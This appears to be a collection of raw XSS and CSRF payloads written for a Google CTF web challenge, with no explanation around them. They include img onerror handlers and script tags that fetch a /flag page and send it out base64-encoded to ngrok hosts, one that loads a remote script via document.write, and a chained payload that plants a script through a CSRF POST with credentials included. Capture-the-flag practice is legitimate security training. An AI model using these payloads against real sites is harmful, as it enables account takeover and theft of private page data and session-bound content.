

```js
fetch('https://typeselfsub.web.ctfcompetition.com/me', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-url-encoded' }, body: 'address=%3Csvg%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&csrf=aae1b3c4-8299-4f9e-8db8-3be14b2c8619' });
```


js payload for address
```js
fetch('https://typeselfsub.web.ctfcompetition.com/flag').then(r => r.text()).then((p) => fetch('https://7713b3ef1338.ngrok.io/' + btoa(p), { mode: 'no-cors' }));
```

html payload for address
```html
<script>fetch('https://typeselfsub.web.ctfcompetition.com/flag').then(r => r.text()).then((p) => fetch('https://7713b3ef1338.ngrok.io/' + btoa(p), { mode: 'no-cors' }));</script>
```

```

```

```html
<img src=x onerror="fetch('https://typeselfsub.web.ctfcompetition.com/me', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-url-encoded' }, body: 'address=%3Csvg%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&csrf=' });">
```


```html
<img src="a.gif" onerror="document.write('\x3cscript src=https://7713b3ef1338.ngrok.io/googlectf/tech-support/s.js>\x3c/script>')" />
```



js payload for chat
```js
<img src="https://1cd202435af1.ngrok.io/" onerror="(function(e){payload=`(function(e){let xhr=new XMLHttpRequest(); xhr.onreadystatechange=function(){  let xhr = new XMLHttpRequest(); xhr.open('POST', 'https://1cd202435af1.ngrok.io/response'); xhr.send(JSON.stringify({'flag': this.responseText})); }; xhr.open('GET', 'https://typeselfsub.web.ctfcompetition.com/flag'); xhr.send();})(this)`; fetch('https://typeselfsub.web.ctfcompetition.com/me', {method: 'POST', mode: 'no-cors', headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include',body: 'address=<script>'%2bpayload%2b'</script>'%2bString.fromCharCode(38)%2b'csrf='}).then(r=> top.location='https://typeselfsub.web.ctfcompetition.com/me');})(this)">
```